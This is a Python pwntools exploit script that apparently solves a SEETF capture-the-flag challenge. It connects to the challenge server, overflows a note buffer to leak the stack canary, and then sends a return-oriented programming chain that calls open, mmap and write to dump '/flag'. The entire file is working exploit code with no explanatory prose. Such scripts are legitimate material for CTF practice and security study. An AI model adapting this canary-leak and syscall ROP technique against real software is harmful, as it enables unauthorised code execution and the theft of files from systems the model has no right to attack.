from pwn import *
elf = ELF('../src/chall')
p = remote('win.the.seetf.sg', 2000)
context.log_level = 'debug'
count = 0

def create():
    global count
    p.sendlineafter(b'> ', b'1')
    p.recvuntil(b'Addr of note ' + str(count).encode() + b' is ')
    addr = int(p.recvline().strip(), 16)
    count += 1
    return addr

def write(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx = ', str(idx).encode())
    p.sendlineafter(b'size to write = ', str(size).encode())
    if size <= 0x1000:
        p.send(data)
    else:
        return
    
def read(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx = ', str(idx).encode())


note0 = create()
log.info('note0: ' + hex(note0))
write(0, 0x100, b'/flag')

create()
create()
create()

write(3, 6000, b'a' * 0x1000)

read(3)

a = p.recvuntil(b'1. create note')
canary = u64(a[5992:6000].ljust(8, b'\x00'))
log.info('canary: ' + hex(canary))

rop = ROP('../src/chall')

payload = b'a' * (8*3)
payload += p64(canary)
payload += p64(0xdeadbeef)

payload += p64(rop.rax.address)
payload += p64(2)
payload += p64(rop.rdi.address) #open("/flag", O_RDONLY, 0)
payload += p64(note0)
payload += p64(rop.rsi.address)
payload += p64(0)
payload += p64(rop.rdx.address)
payload += p64(0)
payload += p64(rop.syscall.address)

payload += p64(rop.rax.address)
payload += p64(9)
payload += p64(rop.rdi.address) #mmap( 0x407000, 0x1000, PROT_READ, MAP_FILE|MAP_PRIVATE, fd, 0)
payload += p64(0x407000)
payload += p64(rop.rsi.address)
payload += p64(0x1000)
payload += p64(rop.rdx.address)
payload += p64(1)
payload += p64(rop.r10.address)
payload += p64(2)
payload += p64(rop.r8.address)
payload += p64(3)
payload += p64(rop.r9.address)
payload += p64(0)
payload += p64(rop.syscall.address)

payload += p64(rop.rax.address)
payload += p64(1)
payload += p64(rop.rdi.address) #write(1, 0x407000, 0x1000) 
payload += p64(1)
payload += p64(rop.rsi.address)
payload += p64(0x407000)
payload += p64(rop.rdx.address)
payload += p64(0x1000)
payload += p64(rop.syscall.address)


p.sendafter(b'> ', payload)
p.sendafter(b'> ', b'4')

p.interactive()